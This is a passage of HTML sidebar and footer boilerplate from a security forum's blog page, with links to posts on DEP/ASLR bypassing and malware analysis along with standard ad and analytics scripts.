+		<div id="userinfoblock" class="floatcontainer">
+			
+			<a class="avatar" href="memberf35f.html?u=61" title="">
+				<span class="avatarcontainer"><img src="OgAAAKECRZIQ0CQMht6ocaZhb4RxV7AN8oAwoXnODx3ShEWW6iUkMn-Agi6QXhZHZzoO57xtCO3wfqfigLPcm16fk4IAm1T1UGRi01ee?u=61&amp;dateline=1311230253" alt="" /></span>
+			</a>
+			
+				
+			<ul class="list_no_decoration" id="usermenu">
+				
+					<li>
+						<a href="memberf35f.html?u=61"><img src="images/site_icons/profile.html" alt="Go to Profile" /> Go to Profile</a>
+					</li>
+				
+				
+				
+
+				
+				
+				<li>
+					<a href="blog110c.html?u=61&amp;do=markread&amp;readhash=" rel="nofollow"><img src="images/site_icons/markasread.html" alt="Mark as Read" /> Mark as Read</a>
+				</li>
+				
+				
+			</ul>
+		</div>
+
+		<div class="blockbody">
+			<div class="blockrow">
+				<div id="userstats">
+					
+					<dl class="stats">
+						<dt>Join Date</dt>
+						<dd>Jul 2010</dd>
+					</dl>
+					
+					
+					
+					<dl class="stats">
+						<dt>Posts</dt>
+						<dd>271</dd>
+					</dl>
+					<dl class="stats">
+						<dt>Blog Entries</dt>
+						<dd>4</dd>
+					</dl>
+					
+					
+					
+					
+					
+				</div>
+
+				
+			</div>		
+		</div>
+	</div>
+	<div class="underblock"></div>
+
+	
+
+	
+
+	
+
+	<ul id="moveable_blocks">
+		
+		
+		
+		
+		
+		
+		
+		
+	<li id="block_category">
+		<div class="block categoryblock" id="block_category_div">
+			<div class="blocksubhead smaller moveable"  id="block_category_handle">
+				<a href="#top" id="collapse_c_blog_categories" class="collapse"><img src="images/buttons/collapse_40b.png" alt="" /></a>
+				
+				Blog Categories
+			</div>
+			<div class="blockbody" id="c_blog_categories">
+				<div class="blockrow">
+					
+					
+						<h2 class="local">Local Categories</h2>
+						<ul class="folderlist hideoverflow">
+							
+<li>
+	<img src="images/misc/blog/folder.html" class="inlineimg" alt="Uncategorized" border="0" />
+	
+		
+			<a href="blog8537.html?u=61&amp;blogcategoryid=-1" title="Uncategorized">Uncategorized</a>
+		
+	
+</li>
+						</ul>
+					
+				</div>
+			</div>
+		</div>
+		<div class="underblock"></div>
+	</li>
+
+	<li id="block_comments">
+		<div class="block smaller moveable" id="block_comments_div">
+			<div class="blocksubhead"  id="block_comments_handle">
+				<a href="#top" id="collapse_c_blog_comments" class="collapse"><img src="images/buttons/collapse_40b.png" alt="" /></a>
+				<a href="blog5232.html?u=61&amp;do=comments">Recent Comments</a>
+			</div>
+			<div class="blockbody" id="c_blog_comments">
+				<ul class="blockrow">
+					<li class="avatarcontent floatcontainer">
+	<a class="smallavatar">
+		
+		<img width="30" alt="" src="images/misc/unknown.html" title=""/>
+		
+	</a>
+	<div class="smallavatartext">
+		
+		
+		<a href="entry3914.html?b=3066&amp;bt=3152#comment3152">Malware Emulation - An Introduction</a>
+
+		<br />
+
+		
+		<span class="shade">by <a href="member2c15.html?u=6597" rel="nofollow" class="shade">hakooraevil</a></span>
+		
+	</div>
+</li><li class="avatarcontent floatcontainer">
+	<a class="smallavatar">
+		
+		<img width="30" alt="" src="OgAAAKECRZIQ0CQMht6ocaZhb4RxV7AN8oAwoXnODx3ShEWW6iUkMn-Agi6QXhZHZzoO57xtCO3wfqfigLPcm16fk4IAm1T1UGRi1af5?u=61&amp;dateline=1311230253&amp;type=thumb" title=""/>
+		
+	</a>
+	<div class="smallavatartext">
+		
+		
+		<a href="entry5206.html?b=242&amp;bt=294#comment294">ASLR DEP bypassing techniques</a>
+
+		<br />
+
+		
+		<span class="shade">by <a href="memberf35f.html?u=61" rel="nofollow" class="shade">&quot;vinnu&quot;</a></span>
+		
+	</div>
+</li>
+				</ul>
+			</div>
+		</div>
+		<div class="underblock"></div>
+	</li>
+
+	<li id="block_entries">
+		<div class="block smaller moveable" id="block_entries_div">
+			<div class="blocksubhead"  id="block_entries_handle">
+				<a href="#top" id="collapse_c_blog_entries" class="collapse"><img id="collapseimg_blog_entries" src="images/buttons/collapse_40b.png" alt="" /></a>
+				<a href="blogf35f.html?u=61">Recent Blog Posts</a>
+			</div>
+			<div class="blockbody" id="c_blog_entries">
+				<ul class="blockrow">
+					<li class="avatarcontent floatcontainer">
+	<a class="smallavatar">
+		
+		<img width="30" alt="" src="OgAAAKECRZIQ0CQMht6ocaZhb4RxV7AN8oAwoXnODx3ShEWW6iUkMn-Agi6QXhZHZzoO57xtCO3wfqfigLPcm16fk4IAm1T1UGRi1af5?u=61&amp;dateline=1311230253&amp;type=thumb" title=""/>
+		
+	</a>
+	<div class="smallavatartext">
+		
+		<a href="entryc896.html?b=3091">Hesperbot DGA : Everything is Dynamically generated using GA</a>
+		
+		<br />
+		
+		11-10-2014 <span class="time">12:01 PM</span>
+	</div>
+</li><li class="avatarcontent floatcontainer">
+	<a class="smallavatar">
+		
+		<img width="30" alt="" src="OgAAAKECRZIQ0CQMht6ocaZhb4RxV7AN8oAwoXnODx3ShEWW6iUkMn-Agi6QXhZHZzoO57xtCO3wfqfigLPcm16fk4IAm1T1UGRi1af5?u=61&amp;dateline=1311230253&amp;type=thumb" title=""/>
+		
+	</a>
+	<div class="smallavatartext">
+		
+		<a href="entry7617.html?b=3066">Malware Emulation - An Introduction</a>
+		
+		<br />
+		
+		06-14-2014 <span class="time">04:05 PM</span>
+	</div>
+</li><li class="avatarcontent floatcontainer">
+	<a class="smallavatar">
+		
+		<img width="30" alt="" src="OgAAAKECRZIQ0CQMht6ocaZhb4RxV7AN8oAwoXnODx3ShEWW6iUkMn-Agi6QXhZHZzoO57xtCO3wfqfigLPcm16fk4IAm1T1UGRi1af5?u=61&amp;dateline=1311230253&amp;type=thumb" title=""/>
+		
+	</a>
+	<div class="smallavatartext">
+		
+		<a href="entry363f.html?b=270">Windows 8 DEP bypass</a>
+		
+		<br />
+		
+		11-18-2011 <span class="time">09:11 AM</span>
+	</div>
+</li><li class="avatarcontent floatcontainer">
+	<a class="smallavatar">
+		
+		<img width="30" alt="" src="OgAAAKECRZIQ0CQMht6ocaZhb4RxV7AN8oAwoXnODx3ShEWW6iUkMn-Agi6QXhZHZzoO57xtCO3wfqfigLPcm16fk4IAm1T1UGRi1af5?u=61&amp;dateline=1311230253&amp;type=thumb" title=""/>
+		
+	</a>
+	<div class="smallavatartext">
+		
+		<a href="entry9367.html?b=242">ASLR DEP bypassing techniques</a>
+		
+		<br />
+		
+		09-21-2011 <span class="time">11:22 AM</span>
+	</div>
+</li>
+				</ul>
+			</div>
+		</div>
+		<div class="underblock"></div>
+	</li>
+
+<li id="block_visitors">
+	<div class="block" id="block_visitors_div">
+		<div class="blocksubhead" id="block_visitors_handle">
+			<a href="#top" id="collapse_c_blog_visitors" class="collapse"><img id="collapseimg_blog_visitors" src="images/buttons/collapse_40b.png" alt="" border="0" /></a>
+			Recent Visitors
+		</div>
+		<div class="blockbody" id="c_blog_visitors">
+			<div class="blockrow">
+				<ul id="recent_visitors_list" class="commalist">
+					
+						<li><a class="username" href="memberfef6.html?u=847">amolnaik4</a>, </li>
+					
+						<li><a class="username" href="member5626.html?u=2">b0nd</a>, </li>
+					
+						<li><a class="username" href="member92ec.html?u=4937">bitgeek</a>, </li>
+					
+						<li><a class="username" href="memberc79f.html?u=3283">c0dist</a>, </li>
+					
+						<li><a class="username" href="member5a29.html?u=25547">cor3sm4sh3r</a>, </li>
+					
+						<li><a class="username" href="membere81f.html?u=8">fb1h2s</a>, </li>
+					
+						<li><a class="username" href="member9f1e.html?u=11187">megamind</a>, </li>
+					
+						<li><a class="username" href="member91c3.html?u=24794">r0B-O</a>, </li>
+					
+						<li><a class="username" href="member6d18.html?u=11357">sesha569</a>, </li>
+					
+						<li><a class="username" href="member5344.html?u=26397">Zharmany</a></li>
+					
+				</ul>
+			</div>
+		</div>
+	</div>
+	<div class="underblock"></div>
+</li>
+<li id="block_archive">
+	<div class="block blogusermenu" id="vb_blogcalendar">
+		<div id="block_archive_div" class="calendar mini">
+	<h4 class="blocksubhead smaller moveable" id="block_archive_handle">
+		<a href="#top" id="collapse_c_blog_calendar" class="collapse"><img src="images/buttons/collapse_40b.png" alt="" /></a>
+		Archive
+	</h4>
+	<div class="blockbody" id="c_blog_calendar">
+		<table width="100%" class="blockrow">
+			<tr>
+				
+					<th class="blocksubhead" align="center" id="vb_blogcalendar_prevmonth" prevmonth="11" prevyear="2014">
+						&nbsp;
+						
+							<a href="blog3e79.html?u=61&amp;m=11&amp;y=2014">&lt;</a>
+						
+						&nbsp;
+					</th>
+									
+				<th class="blocksubhead" colspan="5" align="center" id="vb_blogcalendar_currentmonth">
+					
+						<a href="blog7b1b.html?u=61&amp;m=3&amp;y=2020">March 2020</a>
+					
+				</th>
+				
+					<th class="blocksubhead">
+						&nbsp;&nbsp;&nbsp;
+					</th>
+ 				
+         		</tr>
+			<tr align="center">
+				<td class="blogsubheader">Su</td>
+				<td class="blogsubheader">Mo</td>
+				<td class="blogsubheader">Tu</td>
+				<td class="blogsubheader">We</td>
+				<td class="blogsubheader">Th</td>
+				<td class="blogsubheader">Fr</td>
+				<td class="blogsubheader">Sa</td>
+			</tr>
+			<tr><td class="othermonth">
+	
+		<span class="simpleday">23</span>
+	
+</td><td class="othermonth">
+	
+		<span class="simpleday">24</span>
+	
+</td><td class="othermonth">
+	
+		<span class="simpleday">25</span>
+	
+</td><td class="othermonth">
+	
+		<span class="simpleday">26</span>
+	
+</td><td class="othermonth">
+	
+		<span class="simpleday">27</span>
+	
+</td><td class="othermonth">
+	
+		<span class="simpleday">28</span>
+	
+</td><td class="othermonth">
+	
+		<span class="simpleday">29</span>
+	
+</td></tr><tr><td>
+	
+		<span class="simpleday">1</span>
+	
+</td><td>
+	
+		<span class="simpleday">2</span>
+	
+</td><td>
+	
+		<span class="simpleday">3</span>
+	
+</td><td>
+	
+		<span class="simpleday">4</span>
+	
+</td><td>
+	
+		<span class="simpleday">5</span>
+	
+</td><td>
+	
+		<span class="simpleday">6</span>
+	
+</td><td>
+	
+		<span class="simpleday">7</span>
+	
+</td></tr><tr><td>
+	
+		<span class="simpleday">8</span>
+	
+</td><td>
+	
+		<span class="simpleday">9</span>
+	
+</td><td>
+	
+		<span class="simpleday">10</span>
+	
+</td><td>
+	
+		<span class="simpleday">11</span>
+	
+</td><td>
+	
+		<span class="simpleday">12</span>
+	
+</td><td>
+	
+		<span class="simpleday">13</span>
+	
+</td><td>
+	
+		<span class="simpleday">14</span>
+	
+</td></tr><tr><td>
+	
+		<span class="simpleday">15</span>
+	
+</td><td>
+	
+		<span class="simpleday">16</span>
+	
+</td><td>
+	
+		<span class="simpleday">17</span>
+	
+</td><td>
+	
+		<span class="simpleday">18</span>
+	
+</td><td>
+	
+		<span class="simpleday">19</span>
+	
+</td><td>
+	
+		<span class="simpleday">20</span>
+	
+</td><td>
+	
+		<span class="simpleday">21</span>
+	
+</td></tr><tr><td class="today" title="Today">
+	
+		<span class="simpleday">22</span>
+	
+</td><td>
+	
+		<span class="simpleday">23</span>
+	
+</td><td>
+	
+		<span class="simpleday">24</span>
+	
+</td><td>
+	
+		<span class="simpleday">25</span>
+	
+</td><td>
+	
+		<span class="simpleday">26</span>
+	
+</td><td>
+	
+		<span class="simpleday">27</span>
+	
+</td><td>
+	
+		<span class="simpleday">28</span>
+	
+</td></tr><tr><td>
+	
+		<span class="simpleday">29</span>
+	
+</td><td>
+	
+		<span class="simpleday">30</span>
+	
+</td><td>
+	
+		<span class="simpleday">31</span>
+	
+</td><td class="othermonth">
+	
+		<span class="simpleday">1</span>
+	
+</td><td class="othermonth">
+	
+		<span class="simpleday">2</span>
+	
+</td><td class="othermonth">
+	
+		<span class="simpleday">3</span>
+	
+</td><td class="othermonth">
+	
+		<span class="simpleday">4</span>
+	
+</td></tr>
+		</table>
+	</div>
+</div>
+	</div>
+	<div class="underblock"></div>
+	<script type="text/javascript" src="clientscript/blog_ajax_calendar6719.js?v=421"></script>
+	<script type="text/javascript">
+	<!--
+		blogCalendar = new vB_AJAX_BlogCalendar('blogCalendar', 'vb_blogcalendar', 3, 2020, 61);
+	//-->
+	</script>
+</li>
+	</ul>
+	
+	
+</div></div>
+	
+	<div class="cleardiv"></div>
+</div>
+
+
+<div style="clear: left">
+  
+<div class="google_adsense_footer" style="width:468px; margin:0 auto; padding-top:1em">
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-6847984837250662";
+google_ad_host = "ca-host-pub-2606800903002383";
+google_ad_width = 468;
+google_ad_height = 60;
+google_ad_format = "468x60_as";
+google_ad_type = "text_image";
+google_ad_channel = "";
+google_color_border = "";
+google_color_bg = "";
+google_color_link = "";
+google_color_text = "";
+google_color_url = "";
+google_ui_features = "rc:6";
+//-->
+</script>
+<script type="text/javascript"
+  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div>
+
+  <div id="ad_global_above_footer"><div align="center">
+<script type="text/javascript"><!--
+google_ad_client = "pub-6847984837250662";
+/* 728x90, created 7/9/10 */
+google_ad_slot = "7101394260";
+google_ad_width = 728;
+google_ad_height = 90;
+//-->
+</script>
+<script type="text/javascript"
+src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script></div>
+</div>
+
+<div id="footer" class="floatcontainer footer">
+
+	<form action="../external.html?link=http://garage4hackers.com/forum.php" method="get" id="footer_select" class="footer_select">
+
+		
+			<select name="styleid" onchange="switch_id(this, 'style')">
+				<optgroup label="Quick Style Chooser"><option class="hidden"></option></optgroup>
+				
+					
+					<optgroup label="&nbsp;Standard Styles">
+									
+					
+	<option value="1" class="" selected="selected">-- Default Style</option>
+
+					
+					</optgroup>
+										
+				
+				
+					
+					<optgroup label="&nbsp;Mobile Styles">
+					
+					
+	<option value="2" class="" >-- Default Mobile Style</option>
+
+					
+					</optgroup>
+										
+				
+			</select>	
+		
+		
+		
+	</form>
+
+	<ul id="footer_links" class="footer_links">
+		<li><a href="sendmessage.html" rel="nofollow" accesskey="9">Contact Us</a></li>
+		<li><a href="index.html">Garage4hackers</a></li>
+		
+		
+		<li><a href="archive/index.html">Archive</a></li>
+		<li><a href="../external.html?link=http://glowhost.com/" target="_blank">Web Hosting</a></li>
+		
+		
+		<li><a href="blogf5cd.html?b=270&amp;goto=prev#top" onclick="document.location.hash='top'; return false;">Top</a></li>
+	</ul>
+	
+	
+	
+	
+	<script type="text/javascript">
+	<!--
+		// Main vBulletin Javascript Initialization
+		vBulletin_init();
+		function md5hash(B,A,E,C){if(navigator.userAgent.indexOf("Mozilla/index.html")==1&&parseInt(navigator.appVersion)>=4){var D=hex_md5(str_to_ent(trim(B.value)));A.value=D;if(E){D=hex_md5(trim(B.value));E.value=D}if(!C){B.value=""}}return true};
+	//-->
+	</script>
+        
+</div>
+</div> <!-- closing div for body_wrapper -->
+
+<div class="below_body">
+<div id="footer_time" class="shade footer_time">All times are GMT +5.5. The time now is <span class="time">05:33 PM</span>.</div>
+
+<div id="footer_copyright" class="shade footer_copyright">
+	<!-- Do not remove this copyright notice -->
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	<!-- Do not remove this copyright notice -->	
+</div>
+<div id="footer_morecopyright" class="shade footer_morecopyright">
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	Copyright 2010 - 2017, Garage4Hackers
+	
+</div>
+ 
+
+	<div id="fb-root"></div>
+<script type="text/javascript" src="clientscript/vbulletin_facebook6719.js?v=421"></script>
+
+<script type="text/javascript">
+<!--
+	loadFacebookAPI('en_US');
+	function fbAsyncInit()
+	{
+		vBfb = new vB_Facebook({
+			appid : "170793809601191",
+			connected : 0,
+			active : 0,
+			autoreg : 0,
+			feed_newthread : 1,
+			feed_postreply : 1,
+			feed_blogentry : 1,
+			feed_blogcomment : 1,
+			feed_newarticle : 1,
+			feed_articlecomment : 1
+		});
+	}
+// -->
+</script>
+
+</div>
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try{
+var pageTracker = _gat._getTracker('UA-17311051-3');
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</body>
+</html>
